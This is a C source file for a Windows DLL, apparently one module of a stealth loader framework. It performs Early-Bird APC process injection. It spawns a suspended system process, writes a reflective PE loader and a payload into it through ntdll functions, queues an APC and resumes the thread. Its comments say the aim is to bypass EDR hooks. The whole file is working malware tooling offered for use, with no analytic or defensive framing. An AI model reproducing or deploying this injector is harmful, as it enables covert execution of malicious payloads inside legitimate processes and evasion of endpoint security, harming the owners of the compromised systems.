// STEALTH Early-Bird APC Injection
// Stage: PREINJECT
// Rating: ★★★★★ (top-tier)
//
// Technique: Create suspended process → Write payload → QueueUserAPC → Resume
// The APC executes before the process entry point runs, bypassing many EDR
// hooks.
//
// Uses direct syscalls via GetProcAddress(ntdll) for stealth.

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>


// NT Types
typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
  ULONG Length;
  HANDLE RootDirectory;
  PUNICODE_STRING ObjectName;
  ULONG Attributes;
  PVOID SecurityDescriptor;
  PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
  HANDLE UniqueProcess;
  HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

// Syscall function types
typedef NTSTATUS(NTAPI *pfnNtQueueApcThread)(HANDLE ThreadHandle,
                                             PVOID ApcRoutine,
                                             PVOID ApcRoutineContext,
                                             PVOID ApcStatusBlock,
                                             PVOID ApcReserved);

typedef NTSTATUS(NTAPI *pfnNtAllocateVirtualMemory)(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

typedef NTSTATUS(NTAPI *pfnNtWriteVirtualMemory)(HANDLE ProcessHandle,
                                                 PVOID BaseAddress,
                                                 PVOID Buffer,
                                                 SIZE_T NumberOfBytesToWrite,
                                                 PSIZE_T NumberOfBytesWritten);

typedef NTSTATUS(NTAPI *pfnNtResumeThread)(HANDLE ThreadHandle,
                                           PULONG PreviousSuspendCount);

// Stub API types
typedef struct {
  void *data;
  size_t size;
  BOOL is_pe;
  BOOL in_memory_mode;
} StealthPayload;

typedef StealthPayload *(*pfnGetPayload)(void);
typedef void (*pfnSetInjectionHandled)(void);

static pfnGetPayload g_GetPayload = NULL;
static pfnSetInjectionHandled g_SetInjectionHandled = NULL;
static int g_debug = 0;
static char g_target_process[MAX_PATH] =
    "notepad.exe"; // Default to notepad for safety
static char g_spawn_path[MAX_PATH] =
    ""; // Path to spawn (e.g., C:\Windows\notepad.exe)

// Syscall pointers
static pfnNtQueueApcThread pNtQueueApcThread = NULL;
static pfnNtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
static pfnNtWriteVirtualMemory pNtWriteVirtualMemory = NULL;
static pfnNtResumeThread pNtResumeThread = NULL;

static void init_config() {
  char *debug = getenv("STEALTH_INJECTOR_DEBUG");
  g_debug = (debug && debug[0]);

  // Read target from config (set by stub)
  char target[MAX_PATH] = {0};
  if (GetEnvironmentVariableA("STEALTH_INJECT_TARGET", target, MAX_PATH) > 0 &&
      target[0]) {
    strncpy(g_target_process, target, MAX_PATH - 1);
  }

  // Build spawn path
  GetSystemDirectoryA(g_spawn_path, MAX_PATH);
  strcat(g_spawn_path, "\\");
  strcat(g_spawn_path, g_target_process);
}

static void log_msg(const char *msg) {
  if (!g_debug)
    return;
  char path[MAX_PATH];
  GetTempPathA(sizeof(path), path);
  strcat(path, "stealth_injector.log");
  FILE *f = fopen(path, "a");
  if (f) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    fprintf(f, "[%02d:%02d:%02d] [EARLYBIRD] %s\n", st.wHour, st.wMinute,
            st.wSecond, msg);
    fclose(f);
  }
}

static BOOL ResolveStubExports(void) {
  HMODULE hStub = GetModuleHandleA(NULL);
  if (!hStub)
    return FALSE;
  g_GetPayload = (pfnGetPayload)GetProcAddress(hStub, "stealth_get_payload");
  g_SetInjectionHandled = (pfnSetInjectionHandled)GetProcAddress(
      hStub, "stealth_set_injection_handled");
  return (g_GetPayload != NULL);
}

static BOOL ResolveSyscalls(void) {
  HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
  if (!hNtdll) {
    log_msg("Failed to get ntdll handle");
    return FALSE;
  }

  pNtQueueApcThread =
      (pfnNtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");
  pNtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(
      hNtdll, "NtAllocateVirtualMemory");
  pNtWriteVirtualMemory =
      (pfnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
  pNtResumeThread = (pfnNtResumeThread)GetProcAddress(hNtdll, "NtResumeThread");

  if (!pNtQueueApcThread || !pNtAllocateVirtualMemory ||
      !pNtWriteVirtualMemory || !pNtResumeThread) {
    log_msg("Failed to resolve NT syscalls");
    return FALSE;
  }

  log_msg("NT syscalls resolved");
  return TRUE;
}

// Reflective loader context
typedef struct {
  void *peBase;
  size_t peSize;
  LPVOID pLoadLibraryA;
  LPVOID pGetProcAddress;
  LPVOID pVirtualAlloc;
  LPVOID pVirtualProtect;
  LPVOID pExitThread;
} ReflectiveContext;

// Minimal reflective loader for APC - same as in injector_reflective.c
// This runs in the suspended process's context when APC fires
static DWORD WINAPI ReflectiveLoader(ReflectiveContext *ctx) {
  typedef HMODULE(WINAPI * pLoadLibraryA_t)(LPCSTR);
  typedef FARPROC(WINAPI * pGetProcAddress_t)(HMODULE, LPCSTR);
  typedef LPVOID(WINAPI * pVirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);

  pLoadLibraryA_t fnLoadLibrary = (pLoadLibraryA_t)ctx->pLoadLibraryA;
  pGetProcAddress_t fnGetProcAddress = (pGetProcAddress_t)ctx->pGetProcAddress;
  pVirtualAlloc_t fnVirtualAlloc = (pVirtualAlloc_t)ctx->pVirtualAlloc;

  unsigned char *peData = (unsigned char *)ctx->peBase;

  // Parse PE
  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peData;
  if (dosHeader->e_magic != 0x5A4D)
    return 1;

  PIMAGE_NT_HEADERS ntHeaders =
      (PIMAGE_NT_HEADERS)(peData + dosHeader->e_lfanew);
  if (ntHeaders->Signature != 0x00004550)
    return 2;

  // Allocate for mapped image
  DWORD imageSize = ntHeaders->OptionalHeader.SizeOfImage;
  LPVOID imageBase =
      fnVirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase, imageSize,
                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (!imageBase) {
    imageBase = fnVirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
  }
  if (!imageBase)
    return 3;

  // Copy headers
  for (DWORD i = 0; i < ntHeaders->OptionalHeader.SizeOfHeaders; i++) {
    ((unsigned char *)imageBase)[i] = peData[i];
  }

  // Copy sections
  PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
  for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
    if (section[i].SizeOfRawData > 0) {
      unsigned char *dest =
          (unsigned char *)imageBase + section[i].VirtualAddress;
      unsigned char *src = peData + section[i].PointerToRawData;
      for (DWORD j = 0; j < section[i].SizeOfRawData; j++)
        dest[j] = src[j];
    }
  }

  // Relocations
  ULONGLONG delta = (ULONGLONG)imageBase - ntHeaders->OptionalHeader.ImageBase;
  if (delta != 0 &&
      ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
              .Size > 0) {
    PIMAGE_BASE_RELOCATION reloc =
        (PIMAGE_BASE_RELOCATION)((unsigned char *)imageBase +
                                 ntHeaders->OptionalHeader
                                     .DataDirectory
                                         [IMAGE_DIRECTORY_ENTRY_BASERELOC]
                                     .VirtualAddress);
    while (reloc->VirtualAddress) {
      DWORD numRelocs =
          (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
      WORD *relocData = (WORD *)(reloc + 1);
      for (DWORD i = 0; i < numRelocs; i++) {
        int type = relocData[i] >> 12;
        int offset = relocData[i] & 0xFFF;
        if (type == IMAGE_REL_BASED_DIR64) {
          ULONGLONG *addr = (ULONGLONG *)((unsigned char *)imageBase +
                                          reloc->VirtualAddress + offset);
          *addr += delta;
        } else if (type == IMAGE_REL_BASED_HIGHLOW) {
          DWORD *addr = (DWORD *)((unsigned char *)imageBase +
                                  reloc->VirtualAddress + offset);
          *addr += (DWORD)delta;
        }
      }
      reloc =
          (PIMAGE_BASE_RELOCATION)((unsigned char *)reloc + reloc->SizeOfBlock);
    }
  }

  // Imports
  if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
          .Size > 0) {
    PIMAGE_IMPORT_DESCRIPTOR importDesc =
        (PIMAGE_IMPORT_DESCRIPTOR)((unsigned char *)imageBase +
                                   ntHeaders->OptionalHeader
                                       .DataDirectory
                                           [IMAGE_DIRECTORY_ENTRY_IMPORT]
                                       .VirtualAddress);
    while (importDesc->Name) {
      LPCSTR dllName = (LPCSTR)((unsigned char *)imageBase + importDesc->Name);
      HMODULE hDll = fnLoadLibrary(dllName);
      if (hDll) {
        PIMAGE_THUNK_DATA thunk =
            (PIMAGE_THUNK_DATA)((unsigned char *)imageBase +
                                importDesc->FirstThunk);
        PIMAGE_THUNK_DATA origThunk =
            importDesc->OriginalFirstThunk
                ? (PIMAGE_THUNK_DATA)((unsigned char *)imageBase +
                                      importDesc->OriginalFirstThunk)
                : thunk;
        while (origThunk->u1.AddressOfData) {
          if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
            thunk->u1.Function = (ULONGLONG)fnGetProcAddress(
                hDll, (LPCSTR)(origThunk->u1.Ordinal & 0xFFFF));
          } else {
            PIMAGE_IMPORT_BY_NAME importByName =
                (PIMAGE_IMPORT_BY_NAME)((unsigned char *)imageBase +
                                        origThunk->u1.AddressOfData);
            // Hook ExitProcess to ExitThread
            char exitProc[] = {'E', 'x', 'i', 't', 'P', 'r',
                               'o', 'c', 'e', 's', 's', 0};
            int match = 1;
            for (int k = 0; exitProc[k] && match; k++) {
              if (importByName->Name[k] != exitProc[k])
                match = 0;
            }
            if (match && importByName->Name[11] == 0) {
              thunk->u1.Function = (ULONGLONG)ctx->pExitThread;
            } else {
              thunk->u1.Function =
                  (ULONGLONG)fnGetProcAddress(hDll, importByName->Name);
            }
          }
          thunk++;
          origThunk++;
        }
      }
      importDesc++;
    }
  }

  // Call entry
  typedef BOOL(WINAPI * DllMain_t)(HINSTANCE, DWORD, LPVOID);
  DllMain_t entryPoint =
      (DllMain_t)((unsigned char *)imageBase +
                  ntHeaders->OptionalHeader.AddressOfEntryPoint);
  if (ntHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) {
    entryPoint((HINSTANCE)imageBase, DLL_PROCESS_ATTACH, NULL);
  } else {
    ((void (*)(void))entryPoint)();
  }

  return 0;
}

static void ReflectiveLoaderEnd(void) {}

static BOOL PerformEarlyBirdAPC(StealthPayload *payload) {
  char buf[512];
  STARTUPINFOA si = {0};
  PROCESS_INFORMATION pi = {0};
  si.cb = sizeof(si);

  sprintf(buf, "Starting Early-Bird APC injection");
  log_msg(buf);
  sprintf(buf, "Target: %s", g_spawn_path);
  log_msg(buf);

  // Step 1: Create suspended process
  if (!CreateProcessA(g_spawn_path, NULL, NULL, NULL, FALSE,
                      CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si,
                      &pi)) {
    sprintf(buf, "CreateProcess failed: %lu", GetLastError());
    log_msg(buf);
    return FALSE;
  }

  sprintf(buf, "Created suspended process PID=%lu TID=%lu", pi.dwProcessId,
          pi.dwThreadId);
  log_msg(buf);

  // Step 2: Allocate memory in target
  size_t loaderSize =
      (size_t)((char *)ReflectiveLoaderEnd - (char *)ReflectiveLoader);
  size_t totalSize =
      loaderSize + sizeof(ReflectiveContext) + payload->size + 0x1000;

  PVOID remoteBase = NULL;
  SIZE_T regionSize = totalSize;
  NTSTATUS status = pNtAllocateVirtualMemory(
      pi.hProcess, &remoteBase, 0, &regionSize, MEM_COMMIT | MEM_RESERVE,
      PAGE_EXECUTE_READWRITE);
  if (!NT_SUCCESS(status)) {
    sprintf(buf, "NtAllocateVirtualMemory failed: 0x%08lX", status);
    log_msg(buf);
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return FALSE;
  }

  sprintf(buf, "Allocated %zu bytes at %p", totalSize, remoteBase);
  log_msg(buf);

  // Layout: [Loader][Context][PE data]
  PVOID remoteLoaderAddr = remoteBase;
  PVOID remoteContextAddr = (char *)remoteBase + loaderSize + 64;
  PVOID remotePEAddr =
      (char *)remoteContextAddr + sizeof(ReflectiveContext) + 64;

  // Step 3: Prepare context
  ReflectiveContext ctx = {0};
  ctx.peBase = remotePEAddr;
  ctx.peSize = payload->size;
  ctx.pLoadLibraryA =
      (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
  ctx.pGetProcAddress = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"),
                                               "GetProcAddress");
  ctx.pVirtualAlloc =
      (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
  ctx.pVirtualProtect = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"),
                                               "VirtualProtect");
  ctx.pExitThread =
      (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExitThread");

  // Step 4: Write loader, context, PE using direct syscall
  SIZE_T written;
  status = pNtWriteVirtualMemory(pi.hProcess, remoteLoaderAddr,
                                 ReflectiveLoader, loaderSize, &written);
  if (!NT_SUCCESS(status)) {
    log_msg("Failed to write loader");
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return FALSE;
  }

  status = pNtWriteVirtualMemory(pi.hProcess, remoteContextAddr, &ctx,
                                 sizeof(ctx), &written);
  if (!NT_SUCCESS(status)) {
    log_msg("Failed to write context");
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return FALSE;
  }

  status = pNtWriteVirtualMemory(pi.hProcess, remotePEAddr, payload->data,
                                 payload->size, &written);
  if (!NT_SUCCESS(status)) {
    log_msg("Failed to write PE");
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return FALSE;
  }

  log_msg("Wrote loader, context, and PE to remote process");

  // Step 5: Queue APC to main thread using direct syscall
  status = pNtQueueApcThread(pi.hThread, remoteLoaderAddr, remoteContextAddr,
                             NULL, NULL);
  if (!NT_SUCCESS(status)) {
    sprintf(buf, "NtQueueApcThread failed: 0x%08lX", status);
    log_msg(buf);
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return FALSE;
  }

  log_msg("Queued APC to main thread");

  // Step 6: Resume thread - APC will execute before entry point
  ULONG suspendCount;
  status = pNtResumeThread(pi.hThread, &suspendCount);
  if (!NT_SUCCESS(status)) {
    sprintf(buf, "NtResumeThread failed: 0x%08lX", status);
    log_msg(buf);
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return FALSE;
  }

  log_msg("Resumed thread - APC will execute payload");

  CloseHandle(pi.hThread);
  CloseHandle(pi.hProcess);

  log_msg("SUCCESS: Early-Bird APC injection complete");
  return TRUE;
}

static BOOL PerformInjection(void) {
  log_msg("=== Early-Bird APC Injector Starting ===");

  if (!ResolveSyscalls()) {
    return FALSE;
  }

  if (!ResolveStubExports()) {
    log_msg("Failed to resolve stub exports");
    return FALSE;
  }

  StealthPayload *payload = g_GetPayload();
  if (!payload) {
    log_msg("No payload available");
    return FALSE;
  }

  char buf[256];
  sprintf(buf, "Payload: %zu bytes, is_pe=%d", payload->size, payload->is_pe);
  log_msg(buf);

  if (!payload->is_pe) {
    log_msg("Early-Bird APC requires PE payload for reflective loading");
    return FALSE;
  }

  if (PerformEarlyBirdAPC(payload)) {
    if (g_SetInjectionHandled) {
      g_SetInjectionHandled();
      log_msg("Signaled injection handled");
    }
    return TRUE;
  }

  return FALSE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    DisableThreadLibraryCalls(hinstDLL);
    init_config();
    log_msg("Early-Bird APC Injector loaded");
    PerformInjection();
  }
  return TRUE;
}
